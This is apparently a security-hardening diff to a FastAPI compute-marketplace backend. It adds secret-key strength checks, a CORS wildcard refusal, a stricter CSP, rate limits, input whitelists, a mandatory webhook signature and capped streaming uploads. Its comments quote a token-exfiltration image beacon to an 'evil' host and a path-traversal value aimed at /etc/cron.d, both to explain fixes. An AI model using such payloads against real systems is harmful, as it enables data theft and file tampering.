@@ -49,6 +49,21 @@ def _clean_label(v, *, field: str, maxlen: int = 64, required: bool = False):
         raise ValueError(f"{field} contains invalid characters")
     return v
 
+
+# SECRET_KEY signs every JWT (HS256). A placeholder that ships in the repo (template.env /
+# .env.example) is publicly known, so anyone could forge tokens for any account, including admin —
+# the production gate must reject it, not just a hand-picked shortlist. Both shipped placeholders are
+# < 32 chars, so an explicit set plus a length floor catches them without false-positiving real keys.
+_SECRET_KEY_PLACEHOLDERS = {
+    "", "t", "dev", "change-me", "changeme", "secret", "secret-key",
+    "change_me_openssl_rand_hex_32", "dev-only-change-me", "your-secret-key-here",
+}
+
+
+def _weak_secret_key(v: str) -> bool:
+    s = (v or "").strip()
+    return s.lower() in _SECRET_KEY_PLACEHOLDERS or len(s) < 32
+
 # Observability: structured JSON logging + redaction, optional OTel tracing, and
 # bounded-cardinality Prometheus metrics. Import-safe and degrade-safe — if the telemetry
 # libs or the collector are absent the whole thing becomes a cheap no-op and the app runs
@@ -358,8 +373,8 @@ def _assert_production_is_safe() -> None:
         # the in-process fake (no money moves). This early gate fails closed on fake/unset/typo.
         "STRIPE_GATEWAY is not 'real'":
             os.getenv("STRIPE_GATEWAY", "").strip().lower() != "real",
-        "SECRET_KEY is a default/dev value": os.getenv("SECRET_KEY", "") in
-            ("", "t", "dev", "change-me", "secret"),
+        "SECRET_KEY is a default/dev/placeholder value (or < 32 chars)":
+            _weak_secret_key(os.getenv("SECRET_KEY", "")),
     }
     enabled = [k for k, v in unsafe.items() if v]
     if enabled:
@@ -511,6 +526,14 @@ if _SENTRY_DSN and os.getenv("SENTRY_ENABLED", "true").strip().lower() != "false
 # CORS: explicit allow-list only (never "*" with credentials). Set ALLOWED_ORIGINS
 # to a comma-separated list, e.g. "https://petabyte.market,https://app.petabyte.market".
 _origins = [o.strip() for o in os.getenv("ALLOWED_ORIGINS", "").split(",") if o.strip()]
+# A wildcard "*" combined with allow_credentials=True is a credentialed-wildcard CORS hole
+# (Starlette reflects the caller's Origin with Allow-Credentials: true). Refuse it: an operator
+# who writes ALLOWED_ORIGINS="*" gets no CORS rather than a cross-site credential leak.
+if "*" in _origins:
+    logging.getLogger("petabyte").warning(
+        "ALLOWED_ORIGINS contains '*' — ignoring it: a credentialed wildcard is unsafe. "
+        "List explicit origins instead.")
+    _origins = [o for o in _origins if o != "*"]
 if _origins:
     app.add_middleware(
         CORSMiddleware,
@@ -600,7 +623,8 @@ async def _request_context(request: Request, call_next):
     _ref = request.query_params.get("ref")
     if _ref and 4 <= len(_ref) <= 16 and _ref.isalnum() and not request.cookies.get("pb_ref"):
         response.set_cookie("pb_ref", _ref.upper(), max_age=60*60*24*90,  # 90 days
-                            samesite="lax", httponly=False, path="/")
+                            samesite="lax", httponly=False, path="/",
+                            secure=(request.url.scheme == "https"))
     response.headers["X-Request-ID"] = rid
     response.headers["X-Content-Type-Options"] = "nosniff"
     response.headers["X-Frame-Options"] = "DENY"
@@ -615,7 +639,10 @@ async def _request_context(request: Request, call_next):
         "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
         "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; "
         "font-src 'self' https://fonts.gstatic.com; "
-        "img-src 'self' data: https:; "
+        # img-src is 'self' data: only (no blanket https:): all images are local (/static) or inline
+        # SVG/data URIs, so this removes the `new Image().src='https://evil/?t='+token` beacon channel
+        # that an injected script could otherwise use to exfiltrate data past connect-src 'self'.
+        "img-src 'self' data:; "
         "connect-src 'self'; "
         # Allow the landing-page YouTube embed to load. Without an explicit frame-src, CSP
         # falls back to default-src 'self' and the browser blocks the iframe ("content
@@ -640,12 +667,13 @@ _RL_RULES = {           # path -> (max_hits, window_seconds)
     "/withdraw": (10, 3600),       # money-out probing
     "/route": (60, 60),            # unauth, DB-backed — cap total volume per IP
     "/newsletter/subscribe": (10, 3600),  # public signup — anti-abuse / no email bombing
+    "/create_api_key": (30, 3600),  # authed — bound key-minting so a hijacked session can't flood
 }
 # Paths where EVERY request (not just failures) consumes budget. Credential endpoints
 # count only failures (brute-force guard); an unauthenticated DB-backed endpoint like
 # /route — and the public newsletter signup — must cap total request volume so they can't
 # be used as a bulk/email-bombing oracle.
-_RL_COUNT_ALL = {"/route", "/newsletter/subscribe"}
+_RL_COUNT_ALL = {"/route", "/newsletter/subscribe", "/create_api_key"}
 LOGIN_MAX_FAILS, LOGIN_WINDOW_S = 10, 900
 
 
@@ -1009,6 +1037,26 @@ class TranscodeModel(BaseModel):
     hours: int = Field(default=1, ge=1, le=8760)                   # <=1 year
     gpu_class: Optional[str] = None
     region: Optional[str] = None
+
+    @field_validator("container")
+    @classmethod
+    def _safe_container(cls, v):
+        # `container` is used as a file EXTENSION joined into a path on the seller host by the
+        # transcode/stitch agent (seg{i}.{container}, final.{container}), which runs as root.
+        # Anything but a known container token is a path-traversal / arbitrary-file-write primitive
+        # (e.g. "../../../etc/cron.d/x"). Mirror the strict handling the `volume` field already gets.
+        v = (v or "mp4").strip().lower()
+        if v not in {"mp4", "mkv", "webm", "mov", "avi", "ts", "m4v", "flv", "wmv"}:
+            raise ValueError("container must be one of: mp4, mkv, webm, mov, avi, ts, m4v, flv, wmv")
+        return v
+
+    @field_validator("codec")
+    @classmethod
+    def _safe_codec(cls, v):
+        v = (v or "h264").strip().lower()
+        if v not in {"h264", "h265", "hevc", "av1", "vp9"}:
+            raise ValueError("codec must be one of: h264, h265, hevc, av1, vp9")
+        return v
 
 
 class RenderModel(BaseModel):
@@ -5244,14 +5292,18 @@ async def cal_webhook(request: Request, db: Session = Depends(get_db)):
     sends the attendee/host confirmation itself; this is our own record + alert.
 
     Point a Cal.com webhook (trigger BOOKING_CREATED) at
-    https://petabyte.market/webhooks/cal. If CAL_WEBHOOK_SECRET is set it is
-    HMAC-verified; unset = accept (best-effort for first setup)."""
+    https://petabyte.market/webhooks/cal. CAL_WEBHOOK_SECRET is REQUIRED and every
+    call is HMAC-verified; if it is unset the endpoint is disabled (503) rather than
+    accepting unsigned payloads — otherwise anyone could POST forged bookings to
+    trigger admin emails and write attacker-controlled strings into the audit log."""
     raw = await request.body()
     secret = os.getenv("CAL_WEBHOOK_SECRET", "").strip()
-    if secret:
-        sig = request.headers.get("X-Cal-Signature-256", "")
-        if not verify_webhook_signature(secret, raw, sig):
-            raise HTTPException(status_code=401, detail="invalid signature")
+    if not secret:
+        raise HTTPException(status_code=503,
+                            detail="cal webhook is not configured (set CAL_WEBHOOK_SECRET)")
+    sig = request.headers.get("X-Cal-Signature-256", "")
+    if not verify_webhook_signature(secret, raw, sig):
+        raise HTTPException(status_code=401, detail="invalid signature")
     try:
         payload = json.loads(raw or b"{}")
     except Exception:
@@ -6685,6 +6737,21 @@ class DistributedModel(BaseModel):
     env: Optional[dict] = None
     vpn: bool = False                                       # give the buyer a WireGuard tunnel in
     selftest: bool = False                                  # run the built-in cluster all-reduce self-test
+
+    @field_validator("image")
+    @classmethod
+    def _safe_image(cls, v):
+        # `image` is placed on a `docker run … <image> torchrun …` argv (list form, so no shell
+        # injection). Still reject a value that begins with '-' (docker option-injection) and
+        # constrain to a docker image-reference charset so it can't smuggle flags/paths.
+        if v is None:
+            return v
+        v = v.strip()
+        if v.startswith("-"):
+            raise ValueError("image must not start with '-'")
+        if not re.match(r"^[A-Za-z0-9][A-Za-z0-9_.:/@-]*$", v):
+            raise ValueError("image is not a valid container image reference")
+        return v
 
 
 @app.post("/distributed", tags=["compute"])
@@ -8374,9 +8441,16 @@ async def put_volume_blob(volume_id: int, sha256: str, request: Request,
     clen = request.headers.get("content-length")
     if clen and clen.isdigit() and int(clen) > max_bytes:
         raise HTTPException(status_code=413, detail=f"Blob exceeds {VOLUME_MAX_BLOB_MB} MB limit")
-    body = await request.body()
-    if len(body) > max_bytes:
-        raise HTTPException(status_code=413, detail=f"Blob exceeds {VOLUME_MAX_BLOB_MB} MB limit")
+    # Stream with a hard cap: a chunked upload (no Content-Length) would otherwise skip the header
+    # check above and buffer the ENTIRE body into RAM via request.body() before any size check,
+    # OOMing the worker. Abort the moment cumulative bytes exceed the cap.
+    _chunks, _total = [], 0
+    async for _chunk in request.stream():
+        _total += len(_chunk)
+        if _total > max_bytes:
+            raise HTTPException(status_code=413, detail=f"Blob exceeds {VOLUME_MAX_BLOB_MB} MB limit")
+        _chunks.append(_chunk)
+    body = b"".join(_chunks)
     actual = hashlib.sha256(body).hexdigest()
     if actual != sha:
         raise HTTPException(status_code=400, detail={
